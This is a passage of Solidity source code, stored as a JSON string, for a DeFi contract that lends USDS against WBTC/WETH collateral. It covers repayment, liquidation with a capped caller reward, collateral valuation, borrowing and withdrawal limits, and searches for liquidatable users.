borrowed amount\" );\n\t\trequire( amountRepaid > 0, \"Cannot repay zero amount\" );\n\n\t\t// Decrease the borrowed amount for the user\n\t\tusdsBorrowedByUsers[msg.sender] -= amountRepaid;\n\n\t\t// Have the user send the USDS to the USDS contract so that it can later be burned (on USDS.performUpkeep)\n\t\tusds.safeTransferFrom(msg.sender, address(usds), amountRepaid);\n\n\t\t// Have USDS remember that the USDS should be burned\n\t\tliquidizer.incrementBurnableUSDS( amountRepaid );\n\n\t\t// Check if the user no longer has any borrowed USDS\n\t\tif ( usdsBorrowedByUsers[msg.sender] == 0 )\n\t\t\t_walletsWithBorrowedUSDS.remove(msg.sender);\n\n\t\temit RepaidUSDS(msg.sender, amountRepaid);\n\t\t}\n\n\n\t// Liquidate a position which has fallen under the minimum collateral ratio.\n\t// A default 5% of the value of the collateral is sent to the caller, with the rest being sent to the Liquidator for later conversion to USDS which is then burned.\n\tfunction liquidateUser( address wallet ) external nonReentrant\n\t\t{\n\t\trequire( wallet != msg.sender, \"Cannot liquidate self\" );\n\n\t\t// First, make sure that the user's collateral ratio is below the required level\n\t\trequire( canUserBeLiquidated(wallet), \"User cannot be liquidated\" );\n\n\t\tuint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );\n\n\t\t// Withdraw the liquidated collateral from the liquidity pool.\n\t\t// The liquidity is owned by this contract so when it is withdrawn it will be reclaimed by this contract.\n\t\t(uint256 reclaimedWBTC, uint256 reclaimedWETH) = pools.removeLiquidity(wbtc, weth, userCollateralAmount, 0, 0, totalShares[collateralPoolID] );\n\n\t\t// Decrease the user's share of collateral as it has been liquidated and they no longer have it.\n\t\t_decreaseUserShare( wallet, collateralPoolID, userCollateralAmount, true );\n\n\t\t// The caller receives a default 5% of the value of the liquidated collateral.\n\t\tuint256 rewardPercent = stableConfig.rewardPercentForCallingLiquidation();\n\n\t\tuint256 rewardedWBTC = (reclaimedWBTC * rewardPercent) / 100;\n\t\tuint256 rewardedWETH = (reclaimedWETH * rewardPercent) / 100;\n\n\t\t// Make sure the value of the rewardAmount is not excessive\n\t\tuint256 rewardValue = underlyingTokenValueInUSD( rewardedWBTC, rewardedWETH ); // in 18 decimals\n\t\tuint256 maxRewardValue = stableConfig.maxRewardValueForCallingLiquidation(); // 18 decimals\n\t\tif ( rewardValue > maxRewardValue )\n\t\t\t{\n\t\t\trewardedWBTC = (rewardedWBTC * maxRewardValue) / rewardValue;\n\t\t\trewardedWETH = (rewardedWETH * maxRewardValue) / rewardValue;\n\t\t\t}\n\n\t\t// Reward the caller\n\t\twbtc.safeTransfer( msg.sender, rewardedWBTC );\n\t\tweth.safeTransfer( msg.sender, rewardedWETH );\n\n\t\t// Send the remaining WBTC and WETH to the Liquidizer contract so that the tokens can be converted to USDS and burned (on Liquidizer.performUpkeep)\n\t\twbtc.safeTransfer( address(liquidizer), reclaimedWBTC - rewardedWBTC );\n\t\tweth.safeTransfer( address(liquidizer), reclaimedWETH - rewardedWETH );\n\n\t\t// Have the Liquidizer contract remember the amount of USDS that will need to be burned.\n\t\tuint256 originallyBorrowedUSDS = usdsBorrowedByUsers[wallet];\n\t\tliquidizer.incrementBurnableUSDS(originallyBorrowedUSDS);\n\n\t\t// Clear the borrowedUSDS for the user who was liquidated so that they can simply keep the USDS they previously borrowed.\n\t\tusdsBorrowedByUsers[wallet] = 0;\n\t\t_walletsWithBorrowedUSDS.remove(wallet);\n\n\t\temit Liquidation(msg.sender, wallet, reclaimedWBTC, reclaimedWETH, originallyBorrowedUSDS);\n\t\t}\n\n\n\t// === VIEWS ===\n\n\t// The current market value in USD for a given amount of BTC and ETH using the PriceAggregator\n\t// Returns the value with 18 decimals\n\tfunction underlyingTokenValueInUSD( uint256 amountBTC, uint256 amountETH ) public view returns (uint256)\n\t\t{\n\t\t// Prices from the price feed have 18 decimals\n\t\tuint256 btcPrice = priceAggregator.getPriceBTC();\n        uint256 ethPrice = priceAggregator.getPriceETH();\n\n\t\t// Keep the 18 decimals from the price and remove the decimals from the token balance\n\t\tuint256 btcValue = ( amountBTC * btcPrice ) / wbtcTenToTheDecimals;\n\t\tuint256 ethValue = ( amountETH * ethPrice ) / wethTenToTheDecimals;\n\n\t\treturn btcValue + ethValue;\n\t\t}\n\n\n\t// The current market value of all WBTC/WETH collateral that has been deposited\n\t// Returns the value with 18 decimals\n\tfunction totalCollateralValueInUSD() public view returns (uint256)\n\t\t{\n\t\t(uint256 reservesWBTC, uint256 reservesWETH) = pools.getPoolReserves(wbtc, weth);\n\n\t\treturn underlyingTokenValueInUSD( reservesWBTC, reservesWETH );\n\t\t}\n\n\n\t// The current market value of the user's collateral in USD\n\t// Returns the value with 18 decimals\n\tfunction userCollateralValueInUSD( address wallet ) public view returns (uint256)\n\t\t{\n\t\tuint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );\n\t\tif ( userCollateralAmount == 0 )\n\t\t\treturn 0;\n\n\t\tuint256 totalCollateralShares = totalShares[collateralPoolID];\n\n\t\t// Determine how much collateral share the user currently has\n\t\t(uint256 reservesWBTC, uint256 reservesWETH) = pools.getPoolReserves(wbtc, weth);\n\n\t\tuint256 userWBTC = (reservesWBTC * userCollateralAmount ) / totalCollateralShares;\n\t\tuint256 userWETH = (reservesWETH * userCollateralAmount ) / totalCollateralShares;\n\n\t\treturn underlyingTokenValueInUSD( userWBTC, userWETH );\n\t\t}\n\n\n\t// The maximum amount of collateral that can be withdrawn while keeping the collateral ratio above a default of 200%\n\t// Returns value with 18 decimals\n\tfunction maxWithdrawableCollateral( address wallet ) public view returns (uint256)\n\t\t{\n\t\tuint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );\n\n\t\t// If the user has no collateral then they can't withdraw any collateral\n\t\tif ( userCollateralAmount == 0 )\n\t\t\treturn 0;\n\n\t\t// When withdrawing, require that the user keep at least the inital collateral ratio (default 200%)\n\t\tuint256 requiredCollateralValueAfterWithdrawal = ( usdsBorrowedByUsers[wallet] * stableConfig.initialCollateralRatioPercent() ) / 100;\n\t\tuint256 userCollateralValue = userCollateralValueInUSD( wallet );\n\n\t\t// If the user doesn't even have the minimum amount of required collateral then return zero\n\t\tif ( userCollateralValue <= requiredCollateralValueAfterWithdrawal )\n\t\t\treturn 0;\n\n\t\t// The maximum withdrawable value in USD\n\t\tuint256 maxWithdrawableValue = userCollateralValue - requiredCollateralValueAfterWithdrawal;\n\n\t\t// Return the collateralAmount that can be withdrawn\n\t\treturn userCollateralAmount * maxWithdrawableValue / userCollateralValue;\n   \t\t}\n\n\n\t// The maximum amount of USDS that can be borrowed given the user's current collateral and existing balance of borrowedUSDS.\n\t// Max borrowable USDS defaults to 50% of collateral value.\n\t// Returns value with 18 decimals.\n\tfunction maxBorrowableUSDS( address wallet ) public view returns (uint256)\n\t\t{\n\t\t// If the user doesn't have any collateral, then they can't borrow any USDS\n\t\tif ( userShareForPool( wallet, collateralPoolID ) == 0 )\n\t\t\treturn 0;\n\n\t\t// The user's current collateral value will determine the maximum amount that can be borrowed\n\t\tuint256 userCollateralValue  = userCollateralValueInUSD( wallet );\n\n\t\tif ( userCollateralValue < stableConfig.minimumCollateralValueForBorrowing() )\n\t\t\treturn 0;\n\n\t\tuint256 maxBorrowableAmount = ( userCollateralValue * 100 ) / stableConfig.initialCollateralRatioPercent();\n\n\t\t// Already borrowing more than the max?\n\t\tif ( usdsBorrowedByUsers[wallet] >= maxBorrowableAmount )\n\t\t\treturn 0;\n\n\t\treturn maxBorrowableAmount - usdsBorrowedByUsers[wallet];\n   \t\t}\n\n\n\tfunction numberOfUsersWithBorrowedUSDS() public view returns (uint256)\n\t\t{\n\t\treturn _walletsWithBorrowedUSDS.length();\n\t\t}\n\n\n\t// Confirm that a user can be liquidated - that they have borrowed USDS and that their collateral value / borrowedUSDS ratio is less than the minimum required\n\tfunction canUserBeLiquidated( address wallet ) public view returns (bool)\n\t\t{\n\t\t// Check the current collateral ratio for the user\n\t\tuint256 usdsBorrowedAmount = usdsBorrowedByUsers[wallet];\n\t\tif ( usdsBorrowedAmount == 0 )\n\t\t\treturn false;\n\n\t\tuint256 userCollateralValue = userCollateralValueInUSD(wallet);\n\n\t\t// Make sure the user's position is under collateralized\n\t\treturn (( userCollateralValue * 100 ) / usdsBorrowedAmount) < stableConfig.minimumCollateralRatioPercent();\n\t\t}\n\n\n\tfunction findLiquidatableUsers( uint256 startIndex, uint256 endIndex ) public view returns (address[] memory)\n\t\t{\n\t\taddress[] memory liquidatableUsers = new address[](endIndex - startIndex + 1);\n\t\tuint256 count = 0;\n\n\t\t// Cache\n\t\tuint256 totalCollateralShares = totalShares[collateralPoolID];\n\t\tuint256 totalCollateralValue = totalCollateralValueInUSD();\n\n\t\tif ( totalCollateralValue != 0 )\n\t\t\tfor ( uint256 i = startIndex; i <= endIndex; i++ )\n\t\t\t\t{\n\t\t\t\taddress wallet = _walletsWithBorrowedUSDS.at(i);\n\n\t\t\t\t// Determine the minCollateralValue a user needs to have based on their borrowedUSDS\n\t\t\t\tuint256 minCollateralValue = (usdsBorrowedByUsers[wallet] * stableConfig.minimumCollateralRatioPercent()) / 100;\n\n\t\t\t\t// Determine minCollateral in terms of minCollateralValue\n\t\t\t\tuint256 minCollateral = (minCollateralValue * totalCollateralShares) / totalCollateralValue;\n\n\t\t\t\t// Make sure the user has at least minCollateral\n\t\t\t\tif ( userShareForPool( wallet, collateralPoolID ) < minCollateral )\n\t\t\t\t\tliquidatableUsers[count++] = wallet;\n\t\t\t\t}\n\n\t\t// Resize the array to match the actual number of liquidatable positions found\n\t\taddress[] memory resizedLiquidatableUsers = new address[](count);\n\t\tfor ( uint256 i = 0; i < count; i++ )\n\t\t\tresizedLiquidatableUsers[i] = liquidatableUsers[i];\n\n\t\treturn resizedLiquidatableUsers;\n\t\t}\n\n\n\tfunction findLiquidatableUsers() external view returns (address[] memory)\n\t\t{\n\t\tif ( numberOfUsersWithBorrowedUSDS() == 0 )\n\t\t\treturn new address[](0);\n\n\t\treturn findLiquidatableUsers( 0, numberOfUsersWithBorrowedUSDS() - 1 );\n\t\t}\n\t}"
    }
  ]
}